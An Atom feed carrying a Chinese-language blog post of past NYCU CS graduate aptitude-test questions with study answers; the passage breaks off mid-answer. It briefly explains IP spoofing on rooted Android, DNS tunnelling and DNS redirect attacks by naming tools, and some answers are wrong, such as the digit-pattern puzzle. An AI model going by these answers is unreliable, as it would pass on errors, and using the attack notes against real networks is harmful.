<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>kazma&#39;s blog</title>
  
  <subtitle>Decoding My Life: Tales of Code, Cyber, and Campus Life</subtitle>
  <link href="https://kazma.tw/atom.xml" rel="self"/>
  
  <link href="https://kazma.tw/"/>
  <updated>2024-11-03T00:10:09.497Z</updated>
  <id>https://kazma.tw/</id>
  
  <author>
    <name>kazma</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>頂大資安研究所推甄全攻略：準備過程、技巧分享與面試心得</title>
    <link href="https://kazma.tw/2024/11/02/%E9%A0%82%E5%B0%96%E8%B3%87%E5%AE%89%E7%A0%94%E7%A9%B6%E6%89%80%E6%8E%A8%E7%94%84%E5%85%A8%E6%94%BB%E7%95%A5%EF%BC%9A%E6%BA%96%E5%82%99%E9%81%8E%E7%A8%8B%E3%80%81%E6%8A%80%E5%B7%A7%E5%88%86%E4%BA%AB%E8%88%87%E9%9D%A2%E8%A9%A6%E5%BF%83%E5%BE%97/"/>
    <id>https://kazma.tw/2024/11/02/%E9%A0%82%E5%B0%96%E8%B3%87%E5%AE%89%E7%A0%94%E7%A9%B6%E6%89%80%E6%8E%A8%E7%94%84%E5%85%A8%E6%94%BB%E7%95%A5%EF%BC%9A%E6%BA%96%E5%82%99%E9%81%8E%E7%A8%8B%E3%80%81%E6%8A%80%E5%B7%A7%E5%88%86%E4%BA%AB%E8%88%87%E9%9D%A2%E8%A9%A6%E5%BF%83%E5%BE%97/</id>
    <published>2024-11-02T06:22:10.711Z</published>
    <updated>2024-11-03T00:10:09.497Z</updated>
    
    <content type="html"><![CDATA[<h2 id="交大資工所丙組性向測驗準備"><a href="#交大資工所丙組性向測驗準備" class="headerlink" title="交大資工所丙組性向測驗準備"></a>交大資工所丙組性向測驗準備</h2><p>如果有重複出現的會直接拿掉</p><h3 id="113-考古題"><a href="#113-考古題" class="headerlink" title="113 考古題"></a>113 考古題</h3><ul><li><a class="link"   href="https://www.dcard.tw/f/graduate_school/p/253728478" >https://www.dcard.tw/f/graduate_school/p/253728478 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><ol><li><p>Q: 有一個全域變數 count，且 main() 會執行兩次 inc_count() 函數。現在我們希望使用兩個執行緒（threads）來同時執行這段程式碼。請問要如何避免多執行緒操作 count 時發生競爭條件的錯誤？</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> Count = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inc_count</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">        count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="built_in">inc_count</span>();</span><br><span class="line">    <span class="built_in">inc_count</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>A: 要避免多執行緒操作全域變數 count 時發生競爭條件問題，我們可以使用互斥鎖（mutex）來保護 count 的訪問。這樣可以確保只有一個執行緒在任意時刻修改 count，避免多執行緒造成的數據不一致問題。以下是更新後的程式碼，使用了 std::mutex 來保護 count：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">std::mutex mtx;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">inc_count</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(mtx)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">        count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="function">std::thread <span class="title">t1</span><span class="params">(inc_count)</span></span>;</span><br><span class="line">    <span class="function">std::thread <span class="title">t2</span><span class="params">(inc_count)</span></span>;</span><br><span class="line"></span><br><span class="line">    t1.<span class="built_in">join</span>();</span><br><span class="line">    t2.<span class="built_in">join</span>();</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Count: &quot;</span> &lt;&lt; count &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>Q: 有一個函數 f(int num)，它接受一個整數 num 作為參數，並對該數字進行一系列位元操作（左移和右移），最終返回一個整數結果。我們需要根據給定的數字 11 來執行這個函數，並計算出該數字經過位元操作後的輸出結果（包含二進位和十進位格式）。<br>A: 無法作答。</p></li><li><p>Q1: 為什麼 RAM 容量提升並未線性提高程式執行速度？<br>A1: </p><ul><li>CPU 瓶頸：若 CPU 效能限制了處理速度，增加 RAM 不會提高 CPU 的處理能力。</li><li>I&#x2F;O 瓶頸：若程式頻繁存取硬碟，存取速度受限於硬碟或 SSD 的讀寫速度。</li><li>軟體架構限制：某些程式可能無法有效利用額外的 RAM，例如單一線程程式無法利用多核心或多執行緒優勢。</li><li>作業系統的內存管理：作業系統可能未充分使用新增的 RAM，或未有效管理內存分配，導致額外 RAM 未被完全利用。</li></ul><p>Q2: 通訊軟體在傳遞訊息時，使用者端及伺服器端的完整過程？<br>A2: </p><ul><li>用戶端發送訊息：<ol><li>   輸入：用戶在應用程式中輸入訊息，按下「傳送」按鈕。</li><li>   封包處理：應用程式將訊息進行序列化，封裝成特定格式（如 JSON）。</li><li>   加密：訊息經過加密（如 TLS），確保在傳輸過程中保護資料安全。</li><li>   連接伺服器：用戶端透過網路協議（如 TCP&#x2F;IP）將訊息傳送到伺服器，資料通過網卡傳遞至網路。</li></ol></li><li>伺服器處理訊息：<ol><li>   接收請求：伺服器的網路設備接收到訊息請求。</li><li>   解密：伺服器根據加密協議（如 TLS）解密訊息，還原出用戶端傳來的內容。</li><li>   驗證身份：伺服器確認用戶身份（如 JWT 驗證），確保訊息來自合法的用戶。</li><li>   存儲：訊息儲存於伺服器的資料庫中，並將資料更新至用戶的訊息歷史中。</li><li>   通知接收端：伺服器尋找接收者的狀態，若對方在線，則發送通知；若不在線，則將訊息標記為「未讀」。</li></ol></li><li>用戶端接收訊息：<ol><li>   連接伺服器：接收方的用戶端通過網路協議連接伺服器並接收訊息。</li><li>   解密訊息：用戶端解密訊息以獲取其內容。</li><li>   顯示訊息：訊息顯示在使用者界面中，通知用戶有新的訊息。</li></ol></li></ul></li><li><p>Q: 傳送一個訊息到 LINE 或其他即時通訊軟體，中間過程為何？<br>A:</p><ol><li>   Edge-computing：訊息在靠近使用者的裝置或本地伺服器處理與儲存，快速響應但依賴裝置的運算能力。使用者的裝置透過 socket 連接伺服器，訊息透過 device I&#x2F;O 傳遞，再經過應用層、安全層等處理，快速送達對方。</li><li>   Cloud-computing：訊息經過 socket 傳至雲端伺服器處理。雲端負責所有層級的處理（包括應用層、安全層、加密等），並通過伺服器間連結轉送至接收端。此方式不依賴本地裝置，能擴展大量用戶，但受限於網路延遲。</li><li>   Hybrid：結合 edge 和 cloud，訊息的即時性需求部分在本地端處理，非即時數據在雲端存取。重要訊息先在 edge 端經 socket 連至雲端，透過 layer 處理後進行傳送，達到效率與彈性兼具的效果。</li></ol></li><li><p>Q: 設計一個面部識別解鎖系統的架構（例如用於手機或門鎖），並解釋三種軟體架構的設計情況：全部運行在裝置上（on-device）、全部運行在雲端上（cloud-based）、以及混合模式（hybrid）。另外，結合 DevOps 和 MLOps 的概念，說明這些架構如何影響開發與部署流程。<br>A: </p><ul><li>全部運行在裝置上（On-Device）<ul><li>架構：模型推理和驗證全部在裝置內完成。</li><li>優點：低延遲、即時反應、保護隱私。</li><li>挑戰：依賴裝置性能，更新模型困難。</li><li>DevOps&#x2F;MLOps：需裝置端測試與兼容性管理，模型更新較少且需手動同步。</li></ul></li><li>全部運行在雲端上（Cloud-Based）<ul><li>架構：裝置將影像傳至雲端進行處理，結果返回。</li><li>優點：裝置端負擔輕，模型隨時可更新。</li><li>挑戰：依賴網路連接，有延遲與隱私風險。</li><li>DevOps&#x2F;MLOps：快速迭代，集中部署，雲端模型易於自動化訓練與更新。</li></ul></li><li>混合模式（Hybrid）<ul><li>架構：裝置進行初步推理，需高準度時轉至雲端驗證。</li><li>優點：平衡即時性和精確性。</li><li>挑戰：需管理裝置和雲端間的協同。</li><li>DevOps&#x2F;MLOps：雙端測試，保持模型一致性，雲端更新需同步至裝置。</li></ul></li></ul></li><li><p>Q: 根據 Amdahl’s Law，有一程式的 10% 部分被加速了 90 倍，請問整體的執行速度加快多少？<br>A: <img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/1.1.png"                      alt="1.1"                ><br>貼心小提醒：<br>請準備一分鐘的自我介紹，包含：</p><ul><li>學校&#x2F;系別&#x2F;工作</li><li>你比較有興趣的領域跟得意作品等等，有給一些領域參考（程式設計、演算法、多媒體、AI、網頁、資安）</li></ul></li></ol><h3 id="112-考古題"><a href="#112-考古題" class="headerlink" title="112 考古題"></a>112 考古題</h3><ul><li><a class="link"   href="https://hackmd.io/@jotpac/HkVSK3Hps" >https://hackmd.io/@jotpac/HkVSK3Hps <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><ol><li>Q: 什麼是 Kernel？它如何運作？如何進行 debug？<br>A: Kernel 是操作系統的核心，負責管理硬體資源和與軟體的溝通，透過系統呼叫提供安全的硬體訪問。運作上，Kernel 在開機時載入並常駐內存，管理內存、處理器資源及 I&#x2F;O 等功能。debug 方法可使用 gdb 搭配 qemu 模擬、ftrace 追蹤內核事件，或用 dmesg 檢查 Kernel 日誌等方式。</li><li>   Q: 什麼是 Clang？有什麼用途？<br>  A: Clang 是一個 C、C++ 和其他編程語言的編譯器前端，基於 LLVM。Clang 具有高效的編譯速度和清晰的錯誤訊息，常用於系統軟體開發、程式分析和編譯優化。</li><li>   Q: MMIO（Memory-Mapped I&#x2F;O） 是什麼？<br>  A: MMIO 將硬體設備的 I&#x2F;O 寄存器映射到系統記憶體空間，使 CPU 透過讀寫內存地址進行設備通訊，適合需要快速訪問設備的應用場景。</li><li>   Q: Android 手機是否可以進行 IP Spoofing？如何實現？<br>  A: 是的，可以透過 root 權限來更改網絡封包的來源 IP。使用 iptables 的 mangle 表或自訂 socket 寫入自訂的 IP 地址達到 spoofing 效果，但可能違法或違反網絡政策。</li><li>   Q: 解釋 QUIC 協議，並與 TCP 和 UDP 比較。<br>  A: QUIC 是由 Google 開發的新協議，旨在解決 TCP 的連線建立延遲和 UDP 的無連接缺陷。它基於 UDP 傳輸層，實現了多路複用、低延遲和自動加密，適合低延遲和頻繁連線變更的應用場景，例如串流和即時互動。</li><li>   Q: 當收不到 ACK 時，如何確定對方裝置是關機還是網路問題？<br>  A: 可使用 ping 檢查是否能達到目標的 IP。若無回應且設備支持，通過 ARP 請求看是否有相應的 MAC 地址，或查閱路由表和 DNS 檢查網絡設置。</li><li>   Q: 如果能 ping 到 DNS 伺服器，能否透過其他方式上網？<br>  A: 是的，可以利用 DNS 隧道 將數據封裝在 DNS 查詢中傳輸，這是一種在封鎖或受限網絡中進行隧道通信的方法，例如使用 iodine 或 dnscat2。</li><li>   Q: 如何為家中的 Wi-Fi 路由器增加功能？需要哪些工具？<br>  A: 可以下載並編譯適合路由器的開源韌體（如 OpenWRT 或 DD-WRT），在開發環境下使用 C 或 shell 腳本編寫新功能。需要交叉編譯工具、串口線、韌體燒錄工具及文檔支援。</li><li>   Q: 如何利用 GPU 加速計算？<br>  A: GPU 的多核架構適合大規模並行計算，可使用 CUDA（NVIDIA）或 OpenCL 進行 GPU 加速編程，在深度學習、數據處理等應用中顯著提升運算速度。</li><li>   Q: 什麼是雲原生（Cloud Native）？<br> A: 雲原生是利用容器、微服務架構、持續交付、服務網格等工具和技術來構建和運行可擴展、彈性、動態調度的應用程序，優勢在於更快速的部署和擴展，適合現代的分散式計算環境。</li><li>   Q: 什麼是 MLOps？<br> A: MLOps 是機器學習運營的最佳實踐，結合了機器學習、DevOps 和數據工程，用於自動化模型訓練、部署和監控，確保模型在生產環境中的穩定性和可擴展性。</li></ol><h3 id="111-考古題"><a href="#111-考古題" class="headerlink" title="111 考古題"></a>111 考古題</h3><ul><li><a class="link"   href="https://hackmd.io/@bogay/111-NYCU-CS-aptitude-test" >https://hackmd.io/@bogay/111-NYCU-CS-aptitude-test <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><ol><li><p>Q: Cache -&gt; Virtual Memory -&gt; MMU -&gt; Physical Memory 關係<br>A: </p><ol><li>Cache：位於處理器內的高速記憶體，用於儲存近期存取的資料和指令。Cache 分為 L1、L2、L3 級別，依次離處理器越遠、容量越大、速度越慢。Cache 可減少 CPU 存取較慢的主記憶體 (RAM) 的次數。</li><li>   虛擬記憶體 (Virtual Memory)：虛擬記憶體使每個程式擁有其獨立的記憶體空間，透過分頁機制將主記憶體和硬碟空間結合，並提供比實體記憶體更大的可用空間。虛擬記憶體的地址 (virtual address) 由程式指定，並需要轉換為對應的實體地址。</li><li>   記憶體管理單元 (MMU)：MMU 是處理器中的硬體元件，負責將虛擬記憶體地址轉換為實體記憶體地址。MMU 通常使用分頁表 (page table) 儲存虛擬到實體地址的映射關係，並快取常用的映射資料，提升轉換效率。</li><li>   實體記憶體 (Physical Memory)：即電腦中的主記憶體或 RAM，負責儲存正在執行的資料和程式。處理器透過 MMU 來訪問實體記憶體中的資料。</li></ol><p>整體流程：<br>當 CPU 要存取記憶體地址時，它會先檢查 cache。若 cache 未命中，則 CPU 會使用虛擬地址透過 MMU 查詢對應的實體地址，並從實體記憶體中讀取資料。當記憶體不夠時，虛擬記憶體機制會將較少使用的資料從實體記憶體移至硬碟，以騰出空間。    </p></li><li><p>Q: mmap I&#x2F;O 解釋<br>A: mmap I&#x2F;O 是一種高效的文件操作方式，它將文件直接映射到程式的記憶體空間，使文件內容像在記憶體中一樣被存取。這樣可以減少系統呼叫並提高 I&#x2F;O 性能。當存取映射區域時，系統會自動從文件中載入需要的部分到記憶體。常用於處理大文件、進程間共享記憶體，或操作 I&#x2F;O 設備。</p></li><li><p>Q: AI&#x2F;ML MLOps life cycle<br>A: MLOps 是管理機器學習模型全生命周期的流程，從資料收集、模型開發、部署到監控與優化，強調自動化、版本控制及持續改進。它協助模型在實際環境中穩定高效地運行，並支持快速迭代和擴展。</p></li><li><p>Q: Cloud Native Computing 的 Major 和 Component<br>A: </p><ul><li>Cloud Native Computing 的主要核心（Major）包括：</li></ul><ol><li>   可擴展性：支援高彈性和隨需擴展，適應使用量的變化。</li><li>   彈性和容錯性：具備自我修復能力，減少故障的影響。</li><li>   敏捷開發：支援快速部署、頻繁更新，符合 CI&#x2F;CD 流程。</li></ol><ul><li>其主要組件（Components）包括：</li></ul><ol><li>   容器：例如 Docker，用於輕量化應用打包和移動。</li><li>   微服務：將應用拆分成小型、獨立的服務，易於管理和擴展。</li><li>   Kubernetes：用於容器編排，管理容器的部署和擴展。</li><li>   服務網格：例如 Istio，負責管理微服務間的通信。</li></ol></li><li><p>Q: 0.02468101214… 小數點後第 1000 位是啥數字<br>A: 這個數列的規律是依次增加 2（0、2、4、6、8、1、0、1、2、1、4），每 10 位循環一次。因為我們要找第 1000 位的數字，可以計算 1000 mod 10 &#x3D; 0，這表示第 1000 位正好在一個完整循環的結尾。<br>所以第 1000 位數字就是循環的第 10 位數字，對應的數字為 4。</p></li><li><p>Q: 100 * 99 - 98 * 97 - … + 4 * 3 - 2 * 1 &#x3D;?<br>A: 分組計算應該會發現是等差數列</p></li><li><p>Q: Clang 是啥<br>A: Clang 是一個基於 LLVM 的開源編譯器前端，主要用於 C、C++ 和 Objective-C 等語言的編譯。它的特色是編譯速度快、提供易讀的錯誤訊息、並支援模組化的編譯架構，常用於現代開發環境和工具鏈中。</p></li><li><p>Q: Syntax Directed Compile 是啥<br>A: Syntax Directed Compile 是一種在編譯過程中使用語法導向的規則進行翻譯的方法。它根據語法結構來決定如何生成程式碼，透過語法樹來執行各階段的操作，包含語法分析、語意檢查與中間碼生成，通常用於編譯器設計中來更準確地轉換原始碼至目標碼。</p></li><li><p>Q: DNS redirect attack 是啥? 怎麼在 Linux 上實作<br>A: DNS Redirect Attack 是一種攻擊方法，攻擊者透過竄改 DNS 資料，將用戶的 DNS 請求重新導向到惡意網站，目的是進行釣魚或竊取資料。攻擊方式可能包括 ARP 欺騙、DNS 偽造等。</p><p>在 Linux 上模擬這類攻擊可以使用工具，例如 dnsspoof 或 ettercap，並且設定網卡為混雜模式，然後在網路中攔截和修改 DNS 請求來達成重導效果。不過，這樣的行為會對使用者的隱私與安全造成影響，且屬於違法行為，應僅限於合法、經授權的安全測試環境。</p></li><li><p>Q: 實作過哪些 CVE<br>A: </p><ul><li>CVE-2018-4407 (Apple XNU Kernel Integer Overflow)：<ul><li>這是 macOS 和 iOS 上的一個 kernel 缺陷，但它揭示了 IoT 和嵌入式系統中常見的整數溢位問題。<br>•展示方向：討論如何發現和利用整數溢位，並設計對應的修復方式，這種溢位漏洞在 binary exploitation 中非常普遍。</li></ul></li></ul></li><li><p>Q: buffer overflow 常見的形式<br>A: </p><ol><li>   Stack-based Overflow：當程式過多寫入資料到堆疊中的緩衝區時，可能覆蓋關鍵記憶體地址（例如返回地址），導致程式控制流被劫持。</li><li>   Heap-based Overflow：發生在堆區（heap）中，當分配的記憶體區域被溢出，影響相鄰的記憶體塊，可能導致惡意程式碼執行。</li></ol></li><li><p>Q: TCP 和 UDP 各有不好，所以 Google 推出了新的 protocol QUIC 取代 TCP ，為何?<br>A: Google 推出 QUIC 協議來取代 TCP，主要是為了解決 TCP 和 UDP 的一些缺點。QUIC 結合了 TCP 的可靠傳輸和 UDP 的低延遲特性，提供更快的連線建立速度和更好的流量控制，特別適合於現代網路應用。QUIC 支援多路徑傳輸、減少重傳延遲，並且內建加密，因此提升了傳輸速度、可靠性和安全性，特別適用於高效能的網路服務。</p></li><li><p>Q: TCP Syn 沒有回覆有 IP 沒有機器，和 IP 有機器但沒有對應的 Service，寫 socket programming 時怎麼分辨?<br>A: </p><ol><li>   連線逾時 (Timeout)：若完全沒有收到任何回應，通常表示 IP 地址上沒有機器或網路不通。</li><li>   ICMP 回應 (如 Destination Unreachable)：若收到特定的 ICMP 錯誤回應，表示 IP 存在但該埠沒有服務。這通常是 IP 有機器但該埠上沒有對應的服務。</li></ol></li><li><p>Q: wifi 可能會沒有自己想要的功能，有沒有辦法使用 c 語言在上面新增功能，列出需要的工具<br>A: </p><ol><li>   開發板與驅動程式原始碼：例如 WiFi 模組的 SDK，如 ESP8266 或 ESP32 等開發板的 SDK 和原始碼。</li><li>   C 編譯器與工具鏈：適合目標設備的交叉編譯器（如 GCC 工具鏈），以便將 C 代碼編譯成設備可執行的格式。</li><li>   開發板驅動程式 API 文件：瞭解硬體功能和 API 介面，以便使用正確的函數和控制指令。</li><li>   測試與調試工具：如 JTAG 調試器或 UART 串口工具，便於測試和調整功能。</li></ol></li><li><p>Q: OpenID 和 OAuth 差別<br>A: OpenID 用於「身份驗證」，確認使用者的身份；OAuth 用於「授權」，允許應用程式訪問使用者的特定資源。簡而言之，OpenID 是「誰是你？」而 OAuth 是「可以做什麼？」</p></li><li><p>Q: Instrution-Set Architecture 和 Micro Architecture 差別<br>A: Instruction-Set Architecture (ISA) 定義了電腦處理器所能執行的指令和操作，是硬體和軟體之間的界面。而 Microarchitecture 則是實現這些指令的內部設計結構，決定處理器如何具體執行 ISA 定義的指令。</p></li><li><p>Q: Linux Device Debug 和怎麼不重新編譯就可以測試多筆輸入<br>A: Linux Device Debug：可以使用 dmesg 或 printk() 來查看內核訊息，並使用 strace 或 gdb 調試程式行為。</p><p>測試多筆輸入不重新編譯：可以使用 echo 和 cat 搭配管線，或是把多筆測試資料放在檔案中，利用 &lt; filename 將多筆輸入導入程式，無須重新編譯即可測試不同資料。</p></li><li><p>Q: Top-down 和 buttom-up parse 的差別<br>A: Top-down parse：從根節點開始，逐步將語法結構展開，直到符合輸入序列，常見方法是遞歸下降解析。</p><p>Bottom-up parse：從輸入序列開始，逐步將符號歸約成更高層的語法結構，直到達到根節點，常見方法是移入-歸約解析（如 LR 解析）。</p></li><li><p>Q: 寫個演算法可以找到 Set 中特定的 Item，並嘗試用 GPU 加速<br>A: </p><ol><li>   使用演算法遍歷 Set 中的元素，逐一比對是否為目標 Item。</li><li>   將 Set 分割成多個部分，並在 GPU 中併行執行比對，利用 CUDA 或 OpenCL 等技術來平行化查找過程。</li><li>   在 GPU 中，分配每個執行緒去查找各自部分的元素，加速整體搜索過程。</li></ol></li><li><p>Q: 有個 service 可以 DNS 到 Google，有辦法讓他 access 到其他網站嗎?<br>A: 可以透過修改該服務的 DNS 設定，將它的解析目標指向其他網站的 IP 地址，這樣該服務就可以訪問指定的其他網站。</p></li></ol><h3 id="110-考古題"><a href="#110-考古題" class="headerlink" title="110 考古題"></a>110 考古題</h3><ul><li><a class="link"   href="https://hackmd.io/@as535364/110-NYCU-CS-aptitude-test" >https://hackmd.io/@as535364/110-NYCU-CS-aptitude-test <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>3 頁 5 面 25 題。</li></ul><ol><li><p>Q: 給你以下的 code，請你填空其中一個 if 的條件式，以輸出所有「相加為 sum 的兩個元素」。</p> <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">f</span>(<span class="type">int</span> arr[], <span class="type">int</span> n, <span class="type">int</span> sum) &#123;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="type">int</span> i=<span class="number">0</span>; i&lt;n; ++i ) &#123;</span><br><span class="line">        <span class="keyword">for</span> ( <span class="type">int</span> j=i+<span class="number">1</span>; j&lt;n; ++j ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( ____________ ) &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&#x27;(&#x27;</span> &lt;&lt; arr[i] &lt;&lt; <span class="string">&#x27;,&#x27;</span> &lt;&lt; arr[j] &lt;&lt; <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p> A: if (arr[i] + arr[j] &#x3D;&#x3D; sum)</p></li><li><p>Q: 承上題，問你如何優化這個程式。<br>A: 我們可以建一個哈希表來讓時間複雜度為線性，避免使用兩層迴圈會造成二次方的時間複雜度，優化範例：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> n, <span class="type">int</span> sum)</span> </span>&#123;</span><br><span class="line">    unordered_set&lt;<span class="type">int</span>&gt; seen;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> target = sum - arr[i];</span><br><span class="line">        <span class="keyword">if</span> (seen.<span class="built_in">find</span>(target) != seen.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&#x27;(&#x27;</span> &lt;&lt; arr[i] &lt;&lt; <span class="string">&#x27;,&#x27;</span> &lt;&lt; target &lt;&lt; <span class="string">&#x27;)&#x27;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        seen.<span class="built_in">insert</span>(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>Q: 給一個 reverse_bit 的程式挖空部分 code 給你填，例如 input 11 要 output 13（1011 -&gt; 1101）。<br>A: reverse_bit 實作：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">reverse_bit</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        result = (result &lt;&lt; <span class="number">1</span>) | (n &amp; <span class="number">1</span>);</span><br><span class="line">        n = n &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> n = <span class="number">11</span>;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">reverse_bit</span>(n) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>Q1: process 跟 thread 的差別?<br>A1: </p><ul><li>Process: 一個進程是操作系統中執行中的一個應用程式，每個進程擁有自己獨立的記憶體空間、資源和執行上下文。不同的進程之間不能直接分享記憶體或資源，除非通過特定的通訊方式（如管道、訊息佇列、共享記憶體等）。</li><li>Thread: 線程是進程中的最小執行單位，同一個進程內的線程共享記憶體空間和資源。線程之間的通訊比進程之間更高效，因為它們可以直接訪問相同的資料。</li></ul><p>Q2: 為啥需要 thread?<br>A2: </p><ul><li>並行處理: 線程允許同一個程式的多個部分同時執行，提高處理效率。特別是在 I&#x2F;O 密集型工作（如網路請求、讀寫檔案等）中，線程可以減少等待時間。</li><li>資源共享: 線程能共享相同的記憶體和資源，適合需要處理大量共享資料的應用程式（如網路伺服器等），不需要額外的 IPC（進程間通訊）開銷。</li></ul><p>Q3: 兩個 thread 都要去修改一個值但修完後你發現值怪怪的，為什麼，怎麼解決?<br>A3: 當多個線程同時修改同一個值時，如果沒有適當的同步機制，就會發生競爭條件（Race Condition），導致最終的值不符合預期。競爭條件是由於線程的操作無序造成的，比如一個線程在進行更新之前還未來得及完成，另一個線程就已經讀取並改寫了這個值。<br>解決方法：</p><ul><li>鎖（Lock）: 使用鎖機制（如互斥鎖 mutex），讓每次只有一個線程能進行修改，其他線程必須等到鎖釋放後才能繼續，保證修改過程是原子性的。</li><li>原子操作: 使用原子操作來保證對共享變數的操作是不可分割的，即每個操作都完整執行並確保無線程在執行時干擾。</li><li>條件變數: 有些時候多個線程需要按順序處理某些操作，可以配合條件變數來控制線程的執行順序。</li></ul><p>Q4: Deadlock 怎麼解決?<br>A4: Deadlock 是指當多個線程或進程因為相互等待對方釋放資源，從而導致程序無限期卡住的情況。<br>解決方法：</p><ul><li>避免循環等待: 保證所有鎖按照一致的順序獲取，避免互相等待。例如，A 和 B 必須以同樣順序獲取。</li><li>嘗試鎖機制: 